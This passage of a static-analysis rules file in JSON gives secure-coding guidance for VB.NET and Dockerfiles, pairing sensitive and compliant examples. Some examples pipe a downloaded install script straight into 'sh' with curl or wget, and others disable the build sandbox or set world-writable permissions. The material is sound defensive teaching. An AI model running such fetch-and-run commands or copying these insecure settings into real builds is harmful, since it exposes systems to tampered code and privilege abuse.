href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/648\">CWE-648 - Incorrect Use of Privileged APIs</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "vbnet:S6444": {
        "name": "Not specifying a timeout for regular expressions is security-sensitive",
        "htmlDesc": "<p>Not specifying a timeout for regular expressions can lead to a Denial-of-Service attack. Pass a timeout when using\n<code>System.Text.RegularExpressions</code> to process untrusted input because a malicious user might craft a value for which the evaluation lasts\nexcessively long.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the input passed to the regular expression is untrusted. </li>\n  <li> the regular expression contains patterns vulnerable to <a href=\"https://www.regular-expressions.info/catastrophic.html\">catastrophic\n  backtracking</a>. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to specify a <a\n  href=\"https://learn.microsoft.com/dotnet/standard/base-types/best-practices#use-time-out-values\"><code>matchTimeout</code></a> when executing a\n  regular expression. </li>\n  <li> Make sure regular expressions are not vulnerable to Denial-of-Service attacks by reviewing the patterns. </li>\n  <li> Consider using a non-backtracking algorithm by specifying <a\n  href=\"https://learn.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0\"><code>RegexOptions.NonBacktracking</code></a>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nPublic Sub RegexPattern(Input As String)\n    Dim EmailPattern As New Regex(\".+@.+\", RegexOptions.None)\n    Dim IsNumber as Boolean = Regex.IsMatch(Input, \"[0-9]+\")\n    Dim IsLetterA as Boolean = Regex.IsMatch(Input, \"(a+)+\")\nEnd Sub\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPublic Sub RegexPattern(Input As String)\n    Dim EmailPattern As New Regex(\".+@.+\", RegexOptions.None, TimeSpan.FromMilliseconds(100))\n    Dim IsNumber as Boolean = Regex.IsMatch(Input, \"[0-9]+\", RegexOptions.None, TimeSpan.FromMilliseconds(100))\n    Dim IsLetterA As Boolean = Regex.IsMatch(Input, \"(a+)+\", RegexOptions.NonBacktracking) '.Net 7 And above\n    AppDomain.CurrentDomain.SetData(\"REGEX_DEFAULT_MATCH_TIMEOUT\", TimeSpan.FromMilliseconds(100)) 'process-wide setting\nEnd Sub\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://www.regular-expressions.info/catastrophic.html\">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic\n  Backtracking </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">owasp.org</a> - Regular expression Denial of\n  Service - ReDoS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/standard/base-types/best-practices\">docs.microsoft.com</a> - Best practices for regular expressions\n  in .NET </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/standard/base-types/backtracking-in-regular-expressions\">docs.microsoft.com</a> - Backtracking in\n  Regular Expressions </li>\n  <li> <a\n  href=\"https://devblogs.microsoft.com/dotnet/regular-expression-improvements-in-dotnet-7/#backtracking-and-regexoptions-nonbacktracking\">devblogs.microsoft.com</a> - Regular Expression Improvements in .NET 7: Backtracking (and RegexOptions.NonBacktracking) </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regex.matchtimeout\">docs.microsoft.com</a> - Regex.MatchTimeout\n  Property </li>\n  <li> <a href=\"https://docs.microsoft.com/dotnet/api/system.text.regularexpressions.regexoptions?view=net-7.0\">docs.microsoft.com</a> - RegexOptions\n  Enum (NonBacktracking option) </li>\n</ul>",
        "severity": "MAJOR"
      },
      "vbnet:S4036": {
        "name": "Searching OS commands in PATH is security-sensitive",
        "htmlDesc": "<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>\nenvironment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in\n<code>PATH</code> is a directory under his control.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nDim p As New Process()\np.StartInfo.FileName = \"binary\" ' Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDim p As New Process()\np.StartInfo.FileName = \"C:\\Apps\\binary.exe\" ' Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "docker:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in cURL</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM ubuntu:22.04\n\n# Noncompliant\nRUN curl --tlsv1.0 -O https://tlsv1-0.example.com/downloads/install.sh\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM ubuntu:22.04\n\nRUN curl --tlsv1.2 -O https://tlsv1-3.example.com/downloads/install.sh\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6469": {
        "name": "Permissions of sensitive mount points should be restrictive",
        "htmlDesc": "<p>For mounts types <code>secret</code> and <code>ssh</code>, Dockerfile’s <code>RUN</code> instruction supports a <code>mode</code> option for\nsetting permissions. If you set this mode so that any user of the operating system can access the mount, it is vulnerable to leaks.</p>\n<h2>Why is this an issue?</h2>\n<p>Docker offers a feature to mount files and directories for specific <code>RUN</code> instructions when building Docker images. This feature can be\nused to provide secrets to commands that are executed during the build without baking them into the image. Additionally, it can be used to access SSH\nagents during the build.</p>\n<p>The <code>mode</code> option is an octal value that allows you to specify the permissions for a particular file or directory. By default, on\nDocker, when mounting a <code>secret</code>, it is set to <code>0400</code>.</p>\n<p>For <code>ssh</code>, it is set by default to <code>0600</code>:</p>\n<ul>\n  <li> The first digit <code>0</code> stands for special permissions (like setuid, setgid and sticky bit) and in this case means that no special\n  permissions are set. </li>\n  <li> The following <code>6</code> (4+2 in octal format) means that the <code>owner</code> has read (4) and write (2) permissions </li>\n  <li> <code>00</code> means that the <code>group</code> and <code>others</code> have no permissions. </li>\n</ul>\n<p>If the <code>others</code> bit is set to a value other than 0 at build-time, any other process can access it when the <code>RUN</code> command is\nexecuted: the secrets are vulnerable to supply chain attacks that aim to siphon secrets from containers.</p>\n<h3>What is the potential impact?</h3>\n<h4>Unauthorized access</h4>\n<p>The unintended audience can exploit the leaked private key or equivalent to authenticate themselves as the legitimate owner, gaining unauthorized\nentry to systems, servers, or accounts that accept the key for authentication.</p>\n<p>This unauthorized access opens the door for various malicious activities, including data breaches, unauthorized modifications, and misuse of\nsensitive information.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n# Noncompliant\nRUN --mount=type=secret,id=build_secret,mode=0777 ./installer.sh\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nRUN --mount=type=secret,id=build_secret,mode=0700 ./installer.sh\n</pre>\n<h3>How does this work?</h3>\n<p>In general, always follow the least privilege principle, and set the <code>others</code> bit to <code>0</code>. By default, if <code>mode</code> is\nnot set, permissions are safe.</p>\n<p>In case you made this change because you need to access secrets or agents as a low-privileged user, you can use the options <code>uid</code> and\n<code>gid</code> to provide access without having to resort to world-readable or writable permissions that might expose them to unintended\nparties.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Dockerfile Reference - <a href=\"https://docs.docker.com/engine/reference/builder/#run---mounttypesecret\">RUN --mount=type=secret</a> </li>\n  <li> Red Hat - <a href=\"https://www.redhat.com/sysadmin/linux-file-permissions-explained\">Linux file permissions explained</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6502": {
        "name": "Disabling builder sandboxes is security-sensitive",
        "htmlDesc": "<p>Disabling builder sandboxes can lead to unauthorized access of the host system by malicious programs.</p>\n<p>By default, programs executed by a <code>RUN</code> statement use only a subset of <a\nhref=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">capabilities</a> which are considered safe: this is called <code>sandbox</code>\nmode.</p>\n<p>If you disable the sandbox with the <code>--security=insecure</code> option, the executed command can use the full set of Linux capabilities.<br>\nThis can lead to a container escape. For example, an attacker with the <code>SYS_ADMIN</code> capability is able to mount devices from the host\nsystem.</p>\n<p>This vulnerability allows an attacker who controls the behavior of the ran command to access the host system, break out of the container and\npenetrate the infrastructure.</p>\n<p>After a successful intrusion, the underlying systems are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of service </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The program is controlled by an external entity. </li>\n  <li> The program is part of a supply chain that could be a victim of a supply chain attack. </li>\n</ul>\n<p>There is a risk if you answered yes to either of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Whenever possible, the sandbox should stay enabled to reduce unnecessary risk. </li>\n  <li> If elevated capabilities are absolutely necessary, make sure to verify the integrity of the program before executing it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n# syntax=docker/dockerfile:1-labs\nFROM ubuntu:22.04\n# Sensitive\nRUN --security=insecure ./example.sh\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n# syntax=docker/dockerfile:1-labs\nFROM ubuntu:22.04\nRUN ./example.sh\nRUN --security=sandbox ./example.sh\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/250\">CWE-250 - Execution with Unnecessary Privileges</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#run---security\">Dockerfile reference</a> - RUN </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6505": {
        "name": "Allowing shell scripts execution during package installation is security-sensitive",
        "htmlDesc": "<p>When installing dependencies, package managers like <code>npm</code> will automatically execute shell scripts distributed along with the source\ncode. Post-install scripts, for example, are a common way to execute malicious code at install time whenever a package is compromised.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The execution of dependency installation scripts is required for the application to function correctly. </li>\n</ul>\n<p>There is a risk if you answered no to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Execution of third-party scripts should be disabled if not strictly necessary for dependencies to work correctly. Doing this will reduce the attack\nsurface and block a well-known supply chain attack vector.</p>\n<p>Commands that are subject to this issue are: <code>npm install</code>, <code>yarn install</code> and <code>yarn</code> (<code>yarn</code> without\nan explicit command will execute <code>install</code>).</p>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM node:latest\n\n# Sensitive\nRUN npm install\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nFROM node:latest\n\n# Sensitive\nRUN yarn install\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM node:latest\n\nRUN npm install --ignore-scripts\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nFROM node:latest\n\nRUN yarn install --ignore-scripts\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/506\">CWE-506 - Embedded Malicious Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/829\">CWE-829 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>\n  <li> <a href=\"https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/\">ESLint blog</a> - Postmortem for Malicious Packages\n  Published on July 12th, 2018 </li>\n</ul>",
        "severity": "MAJOR"
      },
      "docker:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFROM example\n# Sensitive\nENV APP_DEBUG=true\n# Sensitive\nENV ENV=development\nCMD /run.sh\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nFROM example\nENV APP_DEBUG=false\nENV ENV=production\nCMD /run.sh\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "docker:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nRUN curl http://www.example.com/\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nRUN curl https://www.example.com/\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6506": {
        "name": "Allowing downgrades to a clear-text protocol is security-sensitive",
        "htmlDesc": "<p>The usage of HTTPS is not enforced here. As it is possible for the HTTP client to follow redirects, such redirects might lead to websites using\nHTTP.</p>\n<p>As HTTP is a clear-text protocol, it is considered insecure. Due to its lack of encryption, attackers that are able to sniff traffic from the\nnetwork can read, modify, or corrupt the transported content. Therefore, allowing redirects to HTTP can lead to several risks:</p>\n<ul>\n  <li> Exposure of sensitive data </li>\n  <li> Malware-infected software updates or installers </li>\n  <li> Corruption of critical information </li>\n</ul>\n<p>Even in isolated networks, such as segmented cloud or offline environments, it is important to ensure the usage of HTTPS. If not, then insider\nthreats with access to these environments might still be able to monitor or tamper with communications.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> It is possible for the requested resource to be redirected to an insecure location in the future. </li>\n</ul>\n<p>There is a risk if you answered yes to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Ensure that the HTTP client only accepts HTTPS pages. In <code>curl</code> this can be enabled using the option <code>--proto \"=https\"</code>.\n  </li>\n  <li> If it is not necessary to follow HTTP redirects, disable this in the HTTP client. In <code>curl</code> this is done by omitting the\n  <code>-L</code> or <code>--location</code> option. In <code>wget</code> this is done by adding the option <code>--max-redirect=0</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In the examples below, an install script is downloaded using <code>curl</code> or <code>wget</code> and then executed.</p>\n<p>While connections made using HTTPS are generally considered secure, <code>https://might-redirect.example.com/install.sh</code> might redirect to a\nlocation that uses HTTP. Downloads made using HTTP are not secure and can be intercepted and modified. An attacker could modify the install script to\nrun malicious code inside the container.</p>\n<p><code>curl</code> will not follow redirects unless either <code>-L</code> or <code>--location</code> option is used.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM ubuntu:22.04\n\n# Sensitive\nRUN curl --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh\n</pre>\n<p><code>wget</code> will follow redirects by default.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nFROM ubuntu:22.04\n\n# Sensitive\nRUN wget --secure-protocol=TLSv1_2 -q -O - https://might-redirect.example.com/install.sh | sh\n</pre>\n<h2>Compliant Solution</h2>\n<p>If you expect the server to redirect the download to a new location, <code>curl</code> can use the option <code>--proto \"=https\"</code> to ensure\nrequests are only made using HTTPS. Any attempt to redirect to a location using HTTP will result in an error.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM ubuntu:22.04\n\nRUN curl --proto \"=https\" --tlsv1.2 -sSf -L https://might-redirect.example.com/install.sh | sh\n</pre>\n<p><code>wget</code> does not support this functionality so <code>curl</code> should be used instead.</p>\n<p>If you expect the server to return the file without redirects, <code>curl</code> should not be instructed to follow redirects. Remove any\n<code>-L</code> or <code>--location</code> options from the command.</p>\n<pre>\nFROM ubuntu:22.04\n\nRUN curl --tlsv1.2 -sSf https://might-redirect.example.com/install.sh | sh\n</pre>\n<p><code>wget</code> uses the option <code>--max-redirect=0</code> to disable redirects.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nFROM ubuntu:22.04\n\nRUN wget --secure-protocol=TLSv1_2 --max-redirect=0 -q -O - https://might-redirect.example.com/install.sh | sh\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/757\">CWE-757 - Selection of Less-Secure Algorithm During Negotiation ('Algorithm\n  Downgrade')</a> </li>\n  <li> <a href=\"https://curl.se/docs/manpage.html#--proto\">curl.1 the man page</a> - <code>--proto &lt;protocols&gt;</code> </li>\n  <li> <a href=\"https://www.gnu.org/software/wget/manual/wget.html#HTTP-Options\">wget - GNU Wget Manual</a> - <code>--max-redirect=</code> </li>\n  <li> <a href=\"https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#41-encrypt-everything\">SSL and TLS Deployment Best\n  Practices</a> - Encrypt Everything </li>\n</ul>",
        "severity": "MAJOR"
      },
      "docker:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The container is designed to be a multi-user environment. </li>\n  <li> Services are run by dedicated low-privileged users to achieve privileges separation. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<p>To be secure, remove the unnecessary permissions. If required, use <code>--chown</code> to set the target user and group.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n# Sensitive\nADD --chmod=777 src dst\n# Sensitive\nCOPY --chmod=777 src dst\n# Sensitive\nRUN chmod +x resource\n# Sensitive\nRUN chmod u+s resource\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nADD --chmod=754 src dst\nCOPY --chown=user:user --chmod=744 src dst\nRUN chmod u+x resource\nRUN chmod +t resource\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#add\">ADD</a> - Docker ADD command </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#copy\">COPY</a> - Docker COPY command </li>\n  <li> <a href=\"https://man.archlinux.org/man/core/man-pages/chmod.1p.en\">chmod reference</a> - <code>chmod</code> command </li>\n  <li> <a href=\"https://man.archlinux.org/man/chown.1.en\">chown reference</a> - <code>chown</code> command </li>\n</ul>",
        "severity": "MAJOR"
      },
      "docker:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFROM ubuntu:22.04\n\n# Sensitive\nRUN echo 